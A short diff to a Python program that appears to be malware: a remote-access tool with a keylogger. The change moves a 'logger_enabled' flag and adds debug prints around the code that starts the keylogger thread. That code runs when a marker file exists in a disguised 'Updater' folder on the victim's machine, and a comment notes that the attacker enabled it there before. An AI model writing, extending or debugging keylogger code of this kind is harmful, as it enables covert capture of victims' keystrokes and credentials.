@@ -290,11 +290,15 @@ def start_keylogger():
     establish_dir()
     keylogger()
 
+logger_enabled = False
+
 if os.path.isfile("C:\\Users\\" + getpass.getuser() + "\\Updater\\updateDDDMA.txt"):
     logger_enabled = True
+    print("KEYSTART")
     # Attacker has enabled keylogger on this machine before
     threading.Thread(target=start_keylogger).start()
-
+else:
+    print("KEY NO START")
 engine = pyttsx3.init()
 voices = engine.getProperty('voices')
 engine.setProperty('rate', 200)
@@ -320,7 +324,6 @@ something = "something"
 cd_check = 0
 invalid_dir = "Invalid Directory"
 has_ben_defed = 0
-logger_enabled = False
 ###############################
 
 
